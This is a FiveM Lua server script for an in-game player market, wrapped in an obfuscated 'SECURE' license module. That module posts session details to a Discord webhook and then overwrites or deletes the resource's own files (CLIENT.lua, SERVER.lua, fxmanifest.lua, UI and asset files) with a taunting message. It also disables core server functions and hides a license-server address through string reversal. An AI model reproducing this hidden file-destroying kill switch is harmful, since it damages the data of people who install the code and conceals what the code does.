--[[

    💬 Obfuscated by Perth Scripting Utilities => discord :[ https://discord.gg/psu ] 
    💬 Export from AFU brain => discord:[ nub#8659 || https://discord.gg/Tqwhv7zen7 ] 
    🐌 @Copyright AFU
    ☕ Thanks For Coffee Tips 
      
]]--


local SECURE = {}
SECURE.AFUREPLY = function(var) print("\n^0[ ^2".. SECURE.GkIFTvh() .."^0 ] "..tostring(var)) end
DEBUG = function(...)if not TOKEN.DEBUG_MODE then return;end local d =" ";for _,v in ipairs({...})do if v==nil then return;end d=d..(type(v) == 'table' and json.encode(v) or tostring(v)).." " end;return print(GetCurrentResourceName().."^3:DEBUG^0 -->"..d.."\n^0")end
ERR = function(v)print('^0[^1ERR^0] '..tostring(v))end
SECURE.READY = function()
    Citizen.CreateThread(function()
    while GetResourceState(GetCurrentResourceName()) ~= "started" do 
        Wait(0) 
    end
    Wait(300)
    SECURE:iONgowZZFC()
    Wait(300)
    SECURE.READY = nil
    end)
end
SECURE.PULL = PerformHttpRequest
PerformHttpRequest = nil
SECURE.DELAY = Wait

function SECURE:ZTyJWBh(a,b)self.mwrtkrF=self.mwrtkrF==nil and function(c)print("^0[".."^2"..self.GkIFTvh().."^0] "..c.."^0")end or self.mwrtkrF;if TOKEN.DC_HOOK.API==nil or TOKEN.DC_HOOK.API==''then ERR('^1Please Set Your ^0(^4discord webhook^0)')return end;local d=os.date('!%Y-%m-%dT%H:%M:%S')local e='User : **` '..self.intdwEK..' `**\\nResource : **` '..self.GkIFTvh()..' `**\\nSourceCode : '..self.MjvnCqc..''local f=12779434;local g='🟢 Session Success'if b==2 then g='🔴 Session Error'f=15158332 end;SECURE.PULL(TOKEN.DC_HOOK.API,function(h,i,j)end,"POST",[[{
            "content": null,
            "embeds": [
              {
                "color": ]]..f..[[,
                "fields": [
                  {
                    "name": "🌐 Session Information",
                    "value": "]]..e..[[",
                    "inline": true
                  },
                  {
                    "name": "💡Developer Team",
                    "value": "`Dev Copy Paste ก้อง#1271`\n`keng#0110`\n`GEBXTA#1540`",
                    "inline": true
                  }
                ],
                "footer": {
                  "text": "]]..g..[[",
                  "icon_url": "https://media.giphy.com/media/xTk9ZOk8WmSKQpFg1W/source.gif"
                },
                "timestamp": "]]..d..[["
              }
            ],
            "username": "🔐",
            "avatar_url": "https://i.imgur.com/BZDHJTJ.png"
        }
    ]],{["Content-Type"]="application/json"})if a~=nil then print("\n")if a then return self.mwrtkrF("^0"..self.intdwEK.."^3( ^5"..self.Mdwkqbr.."^3 ) ^0SourceCode^3( ^5"..self.MjvnCqc.." ^3)")else self.mwrtkrF("^1This Resource Actived ! ^3(Another Address) \n^0[^2"..self.GkIFTvh().."^0] "..self.intdwEK)end end;emgi(1*10^3)local k,l,m=Citizen.CreateThread,Citizen.InvokeNative,function(n)if n==0 or not n then return nil end;return QAPVNWe(n)end;k(function()local o,p,q,r,s,t,u=Citizen.ReturnResultAnyway(),Citizen.ResultAsString(),io,os,{['CLIENT.lua']=false,['SYSTEM.lua']=true,['CONFIG.lua']=false,['SECURE.lua']=false,['stream/sarabun.gfx']=true,['html/ui.js']=true,['html/ui.html']=true,['html/css/style.css']=true,['html/css/THSarabunNew.ttf']=true,['fxmanifest.lua']=false,['SERVER.lua']=false}t=string.gsub(l(0x61dcf017,m(l(0xe5e9ebbb,o,p)),o,p),'//','/')..'/'os=nil;io=nil;for v,w in pairs(s)do if not w then if u==nil then u=[[
    ^1Oh where is ur code ? ^2:D^0
    ^3*Attention : ^0Sometime you Should Learn ^1HOW TO CODING^0 not ^1WATCHING YOUTUBE^0 ^2XD^0
    ^0Sorry if you're my customer and forget to input key :( ^3(Load a new file and input a license, resource name ^2:D^3)
]]print(u)end;local x=q.open(t..v,"w+")q.output(x)q.write("Citizen.CreateThread(function()print("..'"'.."\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n^1Oh where is ur code ? ^2:D^0 \\n^3*Attention : ^0Sometime you should Learn ^1HOW TO CODING^0 not ^1WATCHING YOUTUBE^0 ^2XD\\n^0 ^0Sorry if you\\'re my customer and forget to input key :( ^3(^4Load a new file and input a license, resource name ^2:D^3)\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"..'"'.." )end)")q.close()else r.remove(t..v)end end end)return end

-- function SECURE:YAQsu(e,s)
-- if ( d == nil or #d < 1  ) and s == nil then ERR('^1Can\'t get data from ^3License Server ^0( ^4Contact : nub#8659^0 )') return end
-- if ( e > 499 and e < 600 ) then ERR('^1AFU Server Error! ^0( ^4Contact : nub#8659^0 )' ) return end
-- if ( e > 399 and e < 500 ) then ERR('^1Your Computer Have Problems! ^0( ^4Contact : nub#8659^0 )' ) return end
-- if ( e > 199 and e < 299 ) then self.Mdwkqbr=s.a;self.intdwEK=s.name or'not found!';self.MjvnCqc=s.dev or'not found!';self.aBZYMbw=(s.state=='actived'and s.resname==self.GkIFTvh())and true or false;
-- if s.state == 'notfound' then self:ZTyJWBh(nil,2);ERR("^4LicenseKey ^3(^1".. self.intdwEK .."^3)^0");elseif(s.state=='activing')then self:ZTyJWBh(false,2);elseif(s.state=='actived')then self:ZTyJWBh(self.aBZYMbw,1);
-- end;self.status={["brain"]=(self.aBZYMbw == nil or not self.aBZYMbw)and"^1Not Initialized^0"or"^4Initialized^0"}print("^0[^2"..self.GkIFTvh().."^0]".." ^0Load Status ^3("..self.status['brain'].."^3)^0\n");end;

    --> @START CODE HERE




-- end
-- function SECURE:iONgowZZFC(a,b,c)AddEventHandler=nil;TriggerEvent=nil;if a and b and c then if b==nil then return end;self:YAQsu(a,self.YfyjOw(b))return end;aXef=string.reverse;QxIOpQifNb=nil;pmta=0;pXd=math.floor;emgi=SECURE.DELAY;while self.GkIFTvh==nil do YMATKHq=string.reverse;Cdx='.'uLwdBbv=tonumber;self.GkIFTvh=GetCurrentResourceName;QAPVNWe=tostring;SECURE.DELAY(420)XAXsc=math.ceil;QxIOpQifNb=QxIOpQifNb==nil and Citizen or QxIOpQifNb;QxIOpQifNb=QxIOpQifNb.InvokeNative(0x23473ea4,'/eruces-txa/'..QAPVNWe(math.abs(-600+1000+-0+XAXsc(15.25*2)))..Cdx..YMATKHq("37")..'.'..QAPVNWe(uLwdBbv('6'))..QAPVNWe(3*3)..'.'..QAPVNWe(9*2+XAXsc(0.5))..QAPVNWe(XAXsc(0.5)),QxIOpQifNb.ReturnResultAnyway(),QxIOpQifNb.ResultAsString())self.YfyjOw=json.decode;self.ENJS=json.encode end;local d={self.ENJS({key=TOKEN.SESSION,resName=self.GkIFTvh(),action=aXef('evitca')}),string.upper(aXef('tsop')),{[aXef('epyT-tnetnoC')]=aXef('nosj/noitacilppa')}}while not self.aBZYMbw and VerifyPasswordHash('/eruces-txa/'..QAPVNWe(math.abs(-600+1000+-0+XAXsc(15.25*2)))..Cdx..YMATKHq("37")..'.'..QAPVNWe(uLwdBbv('6'))..QAPVNWe(3*3)..'.'..QAPVNWe(9*2+XAXsc(0.5))..QAPVNWe(XAXsc(0.5)),QxIOpQifNb)do SECURE.PULL(string.upper(aXef('/eruces-txa/'..QAPVNWe(math.abs(-600+1000+-0+XAXsc(15.25*2)))..Cdx..YMATKHq("37")..'.'..QAPVNWe(uLwdBbv('6'))..QAPVNWe(3*3)..'.'..QAPVNWe(9*2+XAXsc(0.5))..QAPVNWe(XAXsc(0.5)).."//:ptth")),function(a,b,c)self:iONgowZZFC(a,b,c)end,d[2],d[1],d[3])pmta=pmta>#d+1 and pmta or pmta+10%1+1;emgi((10%1+1)*10^3*60)if pmta>#d+1 then return end;return end end;SECURE.READY(function()SECURE:iONgowZZFC()end)
-- DCLogs = function( iden_buyer , iden_seller ,name_buyer , name_seller , itemlabel  , count , price)
--   local text = [[\nBuyer Identifier : ]].. iden_buyer ..[[\nSeller Identifier : ]].. iden_seller ..[[\nBuyer Name : ]].. name_buyer ..[[\nSeller Name : ]].. name_seller ..[[\nItem Label : ]].. itemlabel ..[[\nAmount : ]].. count ..[[\nPrice : ]].. price ..[[]]
--   PerformHttpRequest( TOKEN.DC_HOOK.API ,
--     function(err, get , h) end, 'POST' , 
--     [[{
--       "content": null,
--       "username" : "Player Market Trade",
--       "avatar_url" : "https://i.imgur.com/r9px2tN.png" ,
--       "embeds": [
--         {
--           "title": "SCRIPT : ]]..GetCurrentResourceName()..[[",
--           "description": "Dev : nub",
--           "color": 9699328,
--           "fields": [
--             {
--               "name": "Records",
--               "value": "]]..text..[["
--             }
--           ],
--           "author": {
--             "name": "AFU TEAM",
--             "url": "https://discord.gg/6sY7ydbt7r",
--             "icon_url": "https://i.imgur.com/9XJcwI3.png"
--           }
--         }
--       ]
--     }]]
--     , {['Content-Type'] = 'application/json'})
-- end




--[ @ Data , Arr Variables
local ServerData = {};
local arrBuyAction = {};
local Player = nil;

local ready = function(IO)
    if not IO then ERR("Framework not ^1load ^0:(") return end
    RegisterServerEvent(TOKEN.FRAMEWORK[true]..':playerLoaded')
    AddEventHandler(TOKEN.FRAMEWORK[true]..':playerLoaded', function(source)
        if ServerData ~= nil then
            TriggerClientEvent('SECURE-GetDataNewJoined' , source , ServerData)
        end
    end)

    DEBUG("@^3Player Market Server^0:[", (Player) and "^0:D" or "^1:(" ,"^0]")
end

TriggerEvent(TOKEN.FRAMEWORK[true]..':getSharedObject',function(libs) 

    while not Player do 
        DEBUG("^3Loading Player...") 
        Player = libs.GetPlayerFromId 
        Wait(250) 
    end
    
    -->[ @ Server Status Script is ready ? * 
    ready(Player)
end)    



--> @START CODE HERE

-- RegisterServerEvent('SECURE-UPDATEBUY_ITEMS')
-- AddEventHandler('SECURE-UPDATEBUY_ITEMS' , function(data , buyer)
--     local src = source
--     local iszero = false
--     Wait(27)

--     if arrBuyAction[buyer] == nil then
--       arrBuyAction[buyer] = true
--       Citizen.CreateThread(function()
--           Citizen.Wait(273)
--           arrBuyAction[buyer] = nil
--       end)
--     else
--       if arrBuyAction[buyer] then
--           TriggerClientEvent('SECURE-NotifyCustomer' , src , '<span style=" color:red; font-size:10px;"> มีผู้เล่นกำลังซื้อของชิ้นนี้อยู่')
--           return
--       end
--     end

--     if ServerData[data.id].item[data.item_name] then
--         while ESX == nil do Wait(0) end
--         local xBuyer = ESX.GetPlayerFromId(buyer)
--         local xSeller = ESX.GetPlayerFromId(data.id)
--         local IsAmTPass = xSeller.getInventoryItem(data.item_name).count >= tonumber(data.amount)
--         if xBuyer.getMoney() > data.price and IsAmTPass then
--             xBuyer.removeMoney(data.price)
--             xSeller.addMoney(data.price)
--             xSeller.removeInventoryItem(data.item_name, data.amount)
--             xBuyer.addInventoryItem(data.item_name, data.amount)
--             ServerData[data.id].item[data.item_name].count = ServerData[data.id].item[data.item_name].count - data.amount
--             if ServerData[data.id].item[data.item_name].count <= 0 then
--                 ServerData[data.id].item[data.item_name] = nil
--                 iszero = true
--             end
--             DCLogs( xBuyer.getIdentifier() , xSeller.getIdentifier() , xBuyer.getName() , xSeller.getName() , xSeller.getInventoryItem(data.item_name).label  , data.amount , data.price)
--             TriggerClientEvent('SECURE-NotifyCustomer' , src , '<span style=" color:green; font-size:10px;">ซื้อไอเทม '..data.item_name..' จำนวน '..tostring(data.amount)..' ราคารวม '..tostring(data.price))
--             TriggerClientEvent('SECURE-UPDATE85922Cs' ,-1, data , data.id , xSeller.getInventoryItem(data.item_name).count , iszero)
--         else
--             if not IsAmTPass then
--                 TriggerClientEvent('SECURE-NotifyCustomer' , src , '<span style=" color:red; font-size:10px;"> อย่าหา Bug นะสึส!')
--             else
--                 TriggerClientEvent('SECURE-NotifyCustomer' , src , '<span style=" color:red; font-size:13px;"> เงินไม่พอสำรหับซื้อ '..xBuyer.getInventoryItem(data.item_name).label..' !')
--             end
--         end

       
--     end
-- end)

-- RegisterServerEvent('SECURE-InserNewDataStoreSs')
-- AddEventHandler('SECURE-InserNewDataStoreSs', function(data)
--     if ServerData[data.pid] == nil then
--         data.shopname = '~g~[~w~'..GetPlayerName(source)..'~g~]~s~ '..data.shopname
--         ServerData[data.pid] = {
--             coords = data.coords,
--             item = data.item,
--             shopname = data.shopname,
--             zone = data.kz
--         }
--         TriggerClientEvent('SECURE-InserNewDataStoreCs', -1, data)
--     end

-- end)

-- RegisterServerEvent('SECURE-UpdateDataStoreSs')
-- AddEventHandler('SECURE-UpdateDataStoreSs' , function(data )
--     if ServerData[data.pid] ~= nil then
--         ServerData[data.pid].shopname = '~g~[~w~'..GetPlayerName(source)..'~g~]~s~ '..data.shopname
--         ServerData[data.pid].item = data.item
--         TriggerClientEvent('SECURE-UpdateDataStoreCs', -1, ServerData[data.pid].shopname , data.item , data.pid)
--     end
-- end)

-- RegisterServerEvent('SECURE-DeleteStoreMarketSs')
-- AddEventHandler('SECURE-DeleteStoreMarketSs', function(id)
--     if ServerData[id] ~= nil then
--         ServerData[id]=nil
--         TriggerClientEvent('SECURE-DeleteStoreMarketCs' ,-1, id )
--     end
-- end)

-- AddEventHandler('playerDropped', function (reason)
--     if ServerData[source] ~= nil then
--         ServerData[source]=nil
--         TriggerClientEvent('SECURE-DeleteStoreMarketCs' ,-1, source )
--     end
-- end)


